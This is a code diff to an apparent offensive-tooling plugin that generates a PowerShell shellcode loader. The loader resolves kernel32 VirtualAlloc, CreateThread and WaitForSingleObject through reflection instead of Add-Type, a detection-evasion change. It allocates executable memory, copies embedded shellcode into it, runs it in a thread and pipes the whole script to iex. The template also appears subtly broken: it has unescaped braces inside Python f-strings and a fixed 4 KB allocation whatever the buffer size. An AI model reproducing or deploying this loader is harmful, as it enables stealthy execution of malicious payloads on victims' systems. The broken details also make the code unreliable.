@@ -31,29 +31,42 @@ class ProcShellcodeSgr(BaseCradlePlugin):
         payload = []
         payload.append(
             f"({sgr(f"""
-$Kernel32 = @"
-using System;
-using System.Runtime.InteropServices;
+function LookupFunc {{}
+    Param($moduleName, $functionName)
 
-public class Kernel32
-{{
-    [DllImport("kernel32")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32", CharSet=CharSet.Ansi)]
-    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods');
+    $tmp=@();
+    $assem.GetMethods()|ForEach-Object{if($_.Name -eq "GetProcAddress"){$tmp+=$_}};
+    return $tmp[0].Invoke($null,@(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)),$functionName))
 }}
-"@
 
-Add-Type $Kernel32
+function getDelegateType {{
+    Param (
+        [Parameter(Position=0,Mandatory=$True)] [Type[]] $func,
+        [Parameter(Position=1)] [Type] $delType=[Void]
+    )
 
+    $type = [AppDomain]::CurrentDomain.
+        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+        DefineDynamicModule('InMemoryModule',$false).
+        DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass',
+        [System.MulticastDelegate]);
+    $type.
+        DefineConstructor('RTSpecialName, HideBySig, Public',
+        [System.Reflection.CallingConventions]::Standard, $func).
+        SetImplementationFlags('Runtime, Managed');
+    $type.
+        DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual', $delType, $func).
+        SetImplementationFlags('Runtime, Managed');
+
+    return $type.CreateType();
+}}
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 [Byte[]] $buf = {",".join(f"0x{b:02x}" for b in bindat)}
-
-[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$buf.Length,0x3000,0x40);
-[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$buf.Length);
-$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
-[Kernel32]::WaitForSingleObject($thandle,[uint32]"0xFFFFFFFF")
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 """)})|iex;"
         )
 
